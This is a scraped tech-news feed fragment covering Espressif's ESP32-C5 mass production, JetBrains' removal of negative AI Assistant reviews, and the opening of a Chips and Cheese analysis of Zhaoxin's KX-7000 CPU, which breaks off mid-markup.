  <div>
    <h3>Shanghai,China<br>Apr 30, 2025</h3>
    <p>Today, we are glad to announce that ESP32-C5  is now in mass production.</p>
  </div>

  <div>
    <p>Espressif Systems (SSE: 688018.SH) announced ESP32-C5, the industryâ€™s first RISC-V SoC that supports 2.4 GHz and 5 GHz dual-band Wi-Fi 6, along with Bluetooth 5 (LE) and IEEE 802.15.4 (Zigbee, Thread) connectivity.&nbsp;Today, we are glad to announce that ESP32-C5&nbsp; is now in mass production.</p>
<p>ESP32-C5 is designed for applications that require high-efficiency, low-latency wireless transmission. ESP32-C5 has a 32-bit single-core processor which can clock up to 240 MHz in speed. It has a 384 KB on-chip SRAM along with external PSRAM support, 320 KB of ROM. It has up to 29 programmable GPIOs, supporting all the commonly used peripherals, high speed interfaces like SDIO, QSPI, and the best-in-class security features.&nbsp;The ESP32-C5 also includes an LP-CPU running upto 40MHz which can act as the main processor for power sensitive applications. To learn more about the various capabilities and features of this MCU, please visit our <a href="https://www.espressif.com/en/products/socs/esp32-c5">website</a>.</p>
<p>The ESP32-C5 benefits from software support provided by Espressif's well-established IoT development framework, ESP-IDF. The upcoming ESP-IDF v5.5, will include initial support for the ESP32-C5. For a detailed list of ESP-IDF features supported for the ESP32-C5, <a href="https://github.com/espressif/esp-idf/issues/14021">click here</a>. The ESP32-C5 can also act as the connectivity coprocessor for external hosts using the <a href="https://github.com/espressif/esp-at">ESP-AT</a> or <a href="https://github.com/espressif/esp-hosted">ESP-Hosted</a> solutions.</p>
<p>ESP32-C5 development boards are now available for purchase at&nbsp;<a href="https://www.aliexpress.com/item/1005008790788462.html">Espressif's official stores</a>&nbsp;If you are interested in the ESP32-C5 series products, please contact our <a href="https://www.espressif.com/en/contact-us/sales-questions">customer support team</a>.</p>  </div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Mercury, the first commercial-scale diffusion language model (305 pts)]]></title>
            <link>https://www.inceptionlabs.ai/introducing-mercury</link>
            <guid>43851099</guid>
            <pubDate>Wed, 30 Apr 2025 21:51:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.inceptionlabs.ai/introducing-mercury">https://www.inceptionlabs.ai/introducing-mercury</a>, See on <a href="https://news.ycombinator.com/item?id=43851099">Hacker News</a></p>
Couldn't get https://www.inceptionlabs.ai/introducing-mercury: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[JetBrains defends removal of negative reviews for unpopular AI Assistant (168 pts)]]></title>
            <link>https://devclass.com/2025/04/30/jetbrains-defends-removal-of-negative-reviews-for-unpopular-ai-assistant/</link>
            <guid>43850377</guid>
            <pubDate>Wed, 30 Apr 2025 20:36:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://devclass.com/2025/04/30/jetbrains-defends-removal-of-negative-reviews-for-unpopular-ai-assistant/">https://devclass.com/2025/04/30/jetbrains-defends-removal-of-negative-reviews-for-unpopular-ai-assistant/</a>, See on <a href="https://news.ycombinator.com/item?id=43850377">Hacker News</a></p>
<div id="readability-page-1" class="page"><div role="main">
                            <article>
        <div>
            <ul>
                                        <li><a href="https://devclass.com/category/ai-ml/">AI/ML</a></li>
                                            <li><a href="https://devclass.com/category/development/">Development</a></li>
                                </ul>

            <header>
                <!-- title -->
                <h3>
                    <a href="https://devclass.com/2025/04/30/jetbrains-defends-removal-of-negative-reviews-for-unpopular-ai-assistant/" rel="bookmark" title="JetBrains defends removal of negative reviews for unpopular AI Assistant">
                        JetBrains defends removal of negative reviews for unpopular AI Assistant                    </a>
                </h3>

                
            </header>

            <div>
                <!-- image -->
                                        <p><img src="https://devclass.com/wp-content/uploads/2025/04/shutterstock_delete.webp" alt="JetBrains defends removal of negative reviews for unpopular AI Assistant" title="JetBrains defends removal of negative reviews for unpopular AI Assistant">
                                                    </p>
                				
                
<p>JetBrains has defended its removal of negative reviews and feedback for its AI Assistant on its plugin marketplace, stating that this was either in accordance with its policy or to remove outdated content.</p>



<p>The AI Assistant, first released in July 2023, has been downloaded over 22 million times but is rated only 2.3 out of 5. Users this week noticed that some negative reviews were being removed. â€œMy previous comment was deleted without any specific reason. Jetbrains seems to be deleting negative reviews, which destroyed my confidence and trust in this company. They do not value their customers and their feedback anymore. I still give it 1 star, because it installed automatically and is slow and buggy,â€ <a href="https://plugins.jetbrains.com/plugin/22282-jetbrains-ai-assistant/reviews#116888">said one</a> today.&nbsp;</p>



<p>Reaction on social media was to see this as a desperate attempt to improve ratings; but a JetBrains employee&nbsp;<a href="https://www.reddit.com/r/Jetbrains/comments/1ka5h3g/red_flag_jetbrains_removing_bad_reviews_of_their/mpmkzoe/">said</a> that reviews were removed because they mentioned issues that had since been solved, or because they violated <a href="https://www.jetbrains.com/legal/docs/terms/marketplace-content-moderation/">policy</a> such as â€œswearing, etc.â€</p>



<p>The spokesperson added that the company could have done better and said that â€œNuking several reviews at once without a heads-up looked shady. At least, we shouldâ€™ve posted a notice and provided more details to the authors.â€</p>



<p>The incident has drawn attention though to the AI Assistantâ€™s poor reputation. One developer <a href="https://plugins.jetbrains.com/plugin/22282-jetbrains-ai-assistant/reviews#116867">restated</a> their deleted post perhaps in more moderate terms, but said that issues include limited support for third-party model providers, which â€œis restricted to chat operations only,â€ noticeable latency, frequent delays, core features locked to JetBrains cloud services, inconsistent user experience across project types, and sparse documentation.</p><!-- FALCON via Article Inline Ad -->
            



<p>Another common complaint is that the AI Assistant installs itself without permission. A user on Reddit called it â€œthe annoying self-healing/reinstalling phoenix of a plug-in.â€</p>



<p>JetBrains referred us to the Reddit post linked above when we asked for comment on the deleted reviews.</p>



<p>AI services are expensive to provide, because they tend to be processor-intensive, but competition between vendors is a likely reason for JetBrains introducing a <a href="https://devclass.com/2025/04/16/jetbrains-goes-live-with-junie-ai-agent-updates-ai-assistant-adds-free-tier/">free tier</a> earlier this month, as well as a new AI agent called Junie, intended to run alongside AI Assistant. Junie has been better received that the older AI plugin, though cost is an issue. â€œJunie is a great tool, but itâ€™s far too expensive. With the current AI Pro plan, my token quota was used up in just three days,â€ <a href="https://plugins.jetbrains.com/plugin/26104-jetbrains-junie/reviews#116783">said</a> one user.&nbsp;</p>



<p>Unlike competitors such as Microsoft, AWS or Google, JetBrains markets only developer tools and services, and does not have a separate cloud business to fall back on. Products such as the free Visual Studio Code (VS Code) have put pressure on JetBrains to be more generous with community editions of its products, but its business model depends on paying subscribers.</p>



<p>JetBrains IDEs including IntelliJ IDEA for Java and Rider for C# are well liked, though its gradual introduction of a new UI <a href="https://devclass.com/2024/08/06/jetbrains-updates-ides-with-new-ui-by-default-now-a-vs-code-lookalike-some-devs-think-so/">continues to be contentious</a>.&nbsp;&nbsp;</p>
				
							<!-- QUIZ HERE -->
							
				<!-- relpost-thumb-wrapper --><div><a href="https://devclass.com/2025/04/28/gnu-compiler-collection-15-1-released-cobol-support-improved-rust-compatibility-concerns/"><div><p><h2>GNU compiler collection 15.1 released: COBOL support, improved Rust, compatibility concerns</h2></p></div></a><a href="https://devclass.com/2025/04/23/the-hidden-cost-of-dev-stack-diversity-within-an-enterprise-engineering-chaos/"><div><p><h2>The hidden cost of dev stack diversity within an enterprise: 'Engineering chaos'</h2></p></div></a><a href="https://devclass.com/2025/04/17/next-js-15-3-released-with-near-complete-turbopack-support-but-react-server-components-are-under-fire/"><div><p><h2>Next.js 15.3 released with near-complete Turbopack support â€“ but React Server Components are under f...</h2></p></div></a><a href="https://devclass.com/2025/04/16/jetbrains-goes-live-with-junie-ai-agent-updates-ai-assistant-adds-free-tier/"><div><p><h2>JetBrains goes live with Junie AI agent, updates AI assistant, adds free tier</h2></p></div></a><a href="https://devclass.com/2025/04/15/jruby-10-released-with-jump-to-ruby-3-4-java-21-despite-loss-of-red-hat-sponsorship/"><div><p><h2>JRuby 10 released with jump to Ruby 3.4, Java 21, despite loss of Red Hat sponsorship</h2></p></div></a><a href="https://devclass.com/2025/04/14/php-security-audit-of-critical-code-reveals-flaws-fixed-in-new-release/"><div><p><h2>PHP security audit of critical code reveals flaws, fixed in new release</h2></p></div></a><a href="https://devclass.com/2025/04/11/20-years-of-git-never-a-big-thing-for-me-says-inventor-linus-torvalds/"><div><p><h2>20 years of Git: 'Never a big thing for me,' says inventor Linus Torvalds&nbsp;</h2></p></div></a><a href="https://devclass.com/2025/04/10/qcon-london-microsofts-c-now-a-contrarian-choice/"><div><p><h2>QCon London: Microsoftâ€™s C# now a contrarian choice?</h2></p></div></a><a href="https://devclass.com/2025/04/09/encourage-the-ai-coding-skeptics-curb-the-enthusiasts-says-software-exec-at-dev-talk/"><div><p><h2>Encourage the AI coding skeptics, curb the enthusiasts,&nbsp;says software exec at dev talk</h2></p></div></a><a href="https://devclass.com/2025/04/08/vs-code-extension-marketplace-wars-cursor-users-hit-roadblocks/"><div><p><h2>VS Code extension marketplace wars: Cursor users hit roadblocks</h2></p></div></a><a href="https://devclass.com/2025/04/04/python-now-has-a-standard-package-lock-file-format-though-winning-full-adoption-will-be-a-challenge/"><div><p><h2>Python now has a standard package lock file format â€“ though winning full adoption will be a challeng...</h2></p></div></a><a href="https://devclass.com/2025/04/03/what-next-for-vue-js-official-report-promises-fewer-painful-upgrades-and-describes-challenges-with-forthcoming-vapor-mode/"><div><p><h2>What next for Vue.js? Official report promises fewer painful upgrades and describes challenges with ...</h2></p></div></a></div><!-- close relpost-thumb-wrapper -->
            </div>
        </div>
    </article>
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Zhaoxin's KX-7000 (143 pts)]]></title>
            <link>https://chipsandcheese.com/p/zhaoxins-kx-7000</link>
            <guid>43850238</guid>
            <pubDate>Wed, 30 Apr 2025 20:23:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chipsandcheese.com/p/zhaoxins-kx-7000">https://chipsandcheese.com/p/zhaoxins-kx-7000</a>, See on <a href="https://news.ycombinator.com/item?id=43850238">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p>Zhaoxin is a Chinese x86 CPU designer. The KaiXian KX-7000 is Zhaoxinâ€™s latest CPU, and features a new architecture dubbed â€œä¸–çºªå¤§é“â€. ä¸–çºªå¤§é“ is a road in Shanghai called â€œCentury Avenueâ€, following Zhaoxinâ€™s practice of naming architectures after Shanghai landmarks. Zhaoxin is notable because itâ€™s a joint venture between VIA Technologies and the Shanghai municipal government. It inherits VIAâ€™s x86-64 license, and also enjoys powerful government backing. Thatâ€™s a potent combination, because Zhaoxinâ€™s cores are positioned to take advantage of the strong x86-64 software ecosystem.</p><p>x86-64 compatibility is just one part of the picture, because performance matters too. Zhaoxinâ€™s previous LuJiaZui, implemented in the KX-6640MA, was clearly inadequate for handling modern applications. LuJiaZui was a 2-wide core with sub-3 GHz clock speeds and barely more reordering capacity than Intelâ€™s Pentium II from 1997. Century Avenue takes aim at that performance problem.</p><p>Century Avenue is a 4-wide, AVX2 capable core with an out-of-order execution window on par with Intel CPUs from the early 2010s. Besides making the core wider and more latency-tolerant, Zhaoxin targets higher clock speeds. The KX-7000 runs at 3.2 GHz, significantly faster than the KX-6640MAâ€™s 2.6 GHz. Zhaoxinâ€™s site claims the KX-7000 can reach 3.5-3.7 GHz, but I never saw the chip clock above 3.2 GHz.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png" width="1305" height="1115" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1115,&quot;width&quot;:1305,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:25606,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ca621ad-3adf-431d-97a3-8d06f9e17319_1305x1115.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><span>The KX-7000 has eight Century Avenue cores, and uses a chiplet setup reminiscent of single-CCD AMD Ryzen desktop parts. All eight cores sit on a die and share 32 MB of L3 cache. A second IO die connects to DRAM and other IO. Zhaoxin did not specify what process node theyâ€™re using. </span><a href="https://www.techpowerup.com/316685/zhaoxin-launches-kx-7000-desktop-8-core-x86-processor-to-power-chinas-ambitions" rel="">Techpowerup </a><span>and </span><a href="https://wccftech.com/zhaoxin-launches-kx-7000-high-performance-desktop-cpus-for-china-8-cores-3-7-ghz/" rel="">Wccftech </a><span>suggests it uses an unspecified 16nm node.</span></p><p>At the frontend, instructions are fetched from a 64 KB 16-way instruction cache. The instruction cache can deliver 16 bytes per cycle, and feeds a 4-wide decoder. Century Avenue uses a thoroughly conventional frontend setup, without a loop buffer or op cache. Instruction cache bandwidth can therefore constrain frontend throughput if average instruction length exceeds 4 bytes.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png" width="1285" height="585" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/cfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:585,&quot;width&quot;:1285,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:8578,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcfc9c17b-a645-40f3-bfbd-b3729271a7c7_1285x585.png 1456w" sizes="100vw"></picture></div></a></figure></div><p>Frontend bandwidth drops sharply as code spills out of L1i, creating another contrast with 2010s era western designs. Skylake for example can run code from L2 at over 12 bytes per cycle, adequate for &gt;3 IPC with 4 byte instructions. Century Avenue suffers further if code spills into L3, where frontend bandwidth drops to under 4 bytes per cycle.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp" width="1284" height="582" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:582,&quot;width&quot;:1284,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:8740,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/webp&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba1d6fb2-433b-411e-9c85-41cf8156f4ad_1284x582.webp 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>A 4096 entry branch target buffer (BTB) provides branch targets, and creates two pipeline bubbles after a taken branch. Taken branch latency jumps as the test spills out of L1i, even with far fewer than 4K branches. The BTB is likely tied to the L1i, and thus canâ€™t be used to do long-distance prefetch past a L1i miss.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp" width="937" height="515" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:515,&quot;width&quot;:937,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:9476,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/webp&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4437428a-cfc2-4aca-9c8d-6b9ef33e128c_937x515.webp 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Century Avenueâ€™s branching performance is reminiscent of older cores like VIAâ€™s Nano. Dropping zero-bubble branching capability is a regression compared to LuJiaZui, which could do so from a small 16 entry L0 BTB. Perhaps Zhaoxin felt they couldnâ€™t do zero-bubble branching at Century Avenueâ€™s 3 GHz+ clock speed targets. However Intel and AMD CPUs from over a decade ago have faster branch target caching at higher clock speeds.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp" width="938" height="514" 